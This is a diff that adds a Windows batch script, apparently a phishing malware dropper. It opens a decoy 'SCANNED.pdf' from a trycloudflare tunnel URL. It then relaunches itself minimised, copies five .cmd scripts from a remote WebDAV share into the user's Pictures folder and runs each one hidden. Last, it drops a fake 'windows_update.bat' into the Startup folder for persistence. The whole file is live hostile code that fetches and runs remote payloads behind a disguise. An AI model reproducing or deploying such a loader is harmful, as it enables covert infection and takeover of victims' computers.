@@ -1,0 +1,26 @@
+@echo off
+setlocal
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+set source=\\invoicetrycloudflare.com@9983\DavWWWRoot\google\Win
+set destination=%USERPROFILE%\Pictures
+
+echo Opening PDF file...
+start "" "https://bangkok-generally-ensemble-nfl.trycloudflare.com/SCANNED.pdf"
+
+REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, info.cmd, and version.bat to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+copy /Y "%source%\info.cmd" "%destination%"
+
+REM Run kam.cmd, las.cmd, zap.cmd, xff.cmd, and info.cmd
+for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\xff.cmd" "%destination%\info.cmd") do (
+    echo Running %%~nxf...
+    start /MIN cmd /c "%%f"
+)
+
+copy /Y "%source%\windows_update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+exit
